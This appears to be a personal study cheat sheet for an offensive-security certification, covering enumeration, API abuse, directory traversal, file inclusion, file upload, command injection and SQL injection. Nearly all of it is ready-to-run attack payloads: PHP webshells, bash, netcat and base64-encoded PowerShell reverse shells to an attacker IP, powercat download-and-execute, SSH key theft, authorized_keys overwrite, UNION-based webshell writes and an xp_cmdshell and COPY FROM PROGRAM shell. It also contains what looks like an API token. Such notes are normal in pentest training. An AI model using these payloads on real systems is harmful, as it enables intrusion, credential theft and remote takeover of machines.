  # NMAP
fingerprinting
```
nmap -p80 -sV 192.168.241.51
nmap -p80 -sV --script=http-enum 192.168.241.51
```
# GOBUSTER
Directory brute forcing
```
gobuster dir -u 192.168.241.51 -w /usr/share/wordlists/dirb/common.txt -t 5
```
# APIs 
```
gobuster dir -u http://192.168.241.51:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
pattern recognition file
```
{GOBUSTER}/v1
{GOBUSTER}/v2
{GOBUSTER}/v3
{GOBUSTER}/v4
{GOBUSTER}/v5
{GOBUSTER}/v1/admin
```
JSON manipulation
```
curl -i http://192.168.241.51:5002/users/v1/login
#json curl with password
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.241:5002/users/v1/login
# new user as admin
curl -d '{"password":"lab","username":"offsec-admin","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.241:5002/users/v1/login
```
Steal Admin token
```
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```
# XSS 

# Directory traversal
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```
Encoded Chars
```
curl http://192.168.249.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords

curl --path-as-is http://192.168.249.16/cgi-bin/%2F/%2F/%2F/%2F/%2F/%2F/opt/install.txt

curl --path-as-is http://192.168.249.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/install.txt

```


## use their ssh key
```
vim dt_key
chmod 400 dt_key
ssh -i dt_key -p 2222 offsec@mountaindesserts.com

```
## CVE-2021-43798
```
curl --path-as-is http://192.168.249.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt

```

# LFI 
Check First
```
curl http://192.168.241.X/meteor/index.php?page=../../../../../../var/log/apache2/access.log
```
Inject into burp as user agent string in php
```
<?php echo system($_GET['cmd']); ?>
```
inject into GET
```
/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la

# Rev Shell 8080
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.212%2F8080%200%3E%261%22
# Windows type file
GET /meteor/index.php?page=../../../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt
# execute php file
GET /meteor/index.php?page=../../../../../../opt/admin.bak.php

```
### apache 2.4.49 RCE
```
/50383.sh targets.txt /bin/sh "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.212 8080 >/tmp/f"
```


# PHP Wrappers
no encoding
```
curl http://192.168.187.16/meteor/index.php?page=php://filter/resource=/var/www/html/backup.php
```
Encoding
```
curl http://192.168.187.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
```
Command
```
curl "http://192.168.187.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

```
encode our command
```
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

curl "http://192.168.187.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a%0A"
```

# RFI 
PHP CMD
```
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```
Usage
```
http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

```
Host file
```
python3 -m http.server 80

curl "http://192.168.210.16/meteor/index.php?page=http://192.168.45.212/simple-backdoor-php&cmd=ls"

# Get ssh keys
http://192.168.210.16/meteor/index.php?page=http://192.168.45.212/simple-backdoor-php&cmd=ls%20%2Fhome%2F%2A%2F.ssh%2Fauthorized_keys

curl "http://192.168.210.16/meteor/index.php?page=http://192.168.45.212/simple-backdoor-php&cmd=cat%20%2Fhome%2Felaine%2F.ssh%2Fauthorized_keys"

# Reverse shell
curl "http://192.168.210.16/meteor/index.php?page=http://192.168.45.212/php-reverse-shell.php"
```


# File Upload

Upload then curl
```
# Reverse shell
curl "http://192.168.210.16/meteor/uploads/php-reverse-shell.pHP"
```
# PHP 
```
.php7
.phtml
.phps
.pHP
```
Windows (upload simple backdoor first )
```
pwsh 

Make encoded text
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.212",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

#Bytes
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
# encode
$EncodedText =[Convert]::ToBase64String($Bytes)  
# get 
$EncodedText   


# execute
curl "http://192.168.210.189/meteor/uploads/simple-backdoor-php.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAyACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==""



```

# Overwrite AUth_keys
```

ssh-keygen 
cat key.pub > authorized_keys
```
Burp Intercept
```
filename: "../../../../../../../root/.ssh/authorized_keys"
```
Use
```
ssh -i fileup -p 2222 root@mountaindesserts.com -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
```
# Command Injection
Curl (usually filtered)
```
curl -X POST --data 'Archive=git version' http://192.168.210.189:8000/archive
# Join commands
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.210.189:8000/archive
# Windows determine cmd or ps
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.210.189:8000/archive

```
## via powercat
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
pythom -m http.server 80

# DO IT 
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.212%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.212%20-p%204444%20-e%20powershell' http://192.168.210.189:8000/archive

```
NC rev shell
```
curl -X POST --data 'Archive=git%3Bnc%20-e%20%2Fbin%2Fsh%20192.168.45.212%208080%0A' http://192.168.210.16/archive

```
3rd block vuln
```
username=Helpme&password=memememememe&ffa=test"%26whoami"


test"&&bash -c 'bash -i >& /dev/tcp/192.168.45.212/443 0>&1'"
#encoded 
test%22%26%26bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.212%2F443%200%3E%261%27%22%0A%0A

```


# SQL 
Console
```
mqsql -u root -p'root' -h 192.168.X.X -p 3306
	version
	Cntrl+L to clear
	select system_user()
	show databases;
		select user, authentication_string FROM mysql.user WHERE user = 'offsec';
```
Impacket
```
impacket-mssqlclient Administrator:Lab123@192.168.X.X -windows-auth;
select @@version
SELECT name FROM sys.databases;
	SELECT * FROM offsec.information_schema.tables;
	SELECT * from offsec.dbo.users;
	
```
## Manual
```
#test if you can interact with sql 
offsec' 
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 

```
## cmds
```
use test
select * from USERS
```

## Union
```
# need to know # of columns, increase by 1 each time 
' ORDER BY 1-- //'
' ORDER BY 2-- //'
# if 5 columns
%' UNION SELECT database(), user(), @@version, null, null -- //

%' UNION SELECT database(), user(), @@version -- //

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

' UNION SELECT null, username, password, description, null FROM users -- //

# UNION WEBSHELL
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
http://192.168.210.19/tmp/webshell.php?cmd=id
```
## Blind
```
# boolean based
user=offsec' and 1=1 -- //
# time based
user=offsec' and IF (1=1, sleep(3),'false') -- //
```
## Manual
```
# once impacket in
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami'
EXECUTE xp_cmdshell
' UNION SELECT "<?php system($GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
http://192.168.X.X/tmp/webshell.php?cmd=id
```
## sqlmap (banned on exam)
```
sqlmap -u http://192.168.X.X/blindsqli.php?user=1 -p user --dump
sqlmap -u http://192.168.X.X/blindsqli.php?user=1 -p user

# save post request in burp (p= vulnerable item) (root=writeable)
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```
# SQLMAP
```
bruh idek
sqlmap -url "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1*" -D wordpress -T wp_users --dump --ignore-code 404
```
# Checklist
get application/version 
robots.txt
sitemap.xml
dirb 
check admin.php and index.php
find / -name flag.txt

# WPSCAN
JnUFMUWZpIdQe6ZneVs2Q9lSGkS8pgQL2uV4nvjwegs


weight=12&height=12' AND 1=1;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'nc -c sh 192.xxx.xx.xxx 9999'--&age=12&gender=Male&email=ad%40ad.ad   



# Gobuster
gobuster dir -u http://192.168.189.197 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x pdf